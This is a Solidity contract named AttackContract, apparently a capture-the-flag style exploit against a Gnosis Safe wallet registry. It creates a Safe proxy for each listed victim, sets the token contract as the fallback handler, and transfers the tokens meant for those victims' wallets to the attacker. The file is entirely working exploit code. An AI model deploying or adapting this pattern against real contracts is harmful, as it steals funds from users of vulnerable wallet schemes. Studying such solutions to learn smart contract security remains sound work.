// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "hardhat/console.sol";

contract AttackContract {

    address private owner;

    IERC20 public token;
    GnosisSafeProxyFactory gnosisFactory;
    address gnosisSingleton;
    address walletRegistry;
    address[] public victims;

    constructor(
        address _token,
        address _gnosisFactory,
        address _gnosisSingleton,
        address _walletRegistry,
        address[] memory _victims
        ) 
    {
        owner = msg.sender;
        token = IERC20(_token);
        gnosisFactory = GnosisSafeProxyFactory(_gnosisFactory);
        gnosisSingleton = _gnosisSingleton;
        walletRegistry = _walletRegistry;
        victims = _victims;

    }

    function executeAttack() external 
    {
        GnosisSafeProxy victimWallet;
        bytes memory initializer;

        for (uint256 i = 0; i < victims.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = victims[i];
            //create the initializers for the GnosisSafe wallet
            initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, //setup
                owners,     //_owners
                1,              //threshold
                address(0),     //to
                0x0,          //data
                address(token), //fallbackHandler
                address(0),     //paymentToken
                0,              //payment
                address(0)      //paymentReceiver
             );
             console.log("initializer:");
             console.logBytes(initializer);

            //creates GnosisSafe wallet for each victim and get the address of the wallet
            victimWallet = gnosisFactory.createProxyWithCallback(
                gnosisSingleton,
                initializer,
                0,
                IProxyCreationCallback(walletRegistry)
            );
            require(address(victimWallet) != address(0), "wallet creation failed");

            (bool success, ) = address(victimWallet).call(abi.encodeWithSignature("transfer(address,uint256)", owner, 10 ether));
            require(success, "approve failed");
        }
    }

    receive() external payable {
    }
    fallback() external payable {
    }
}
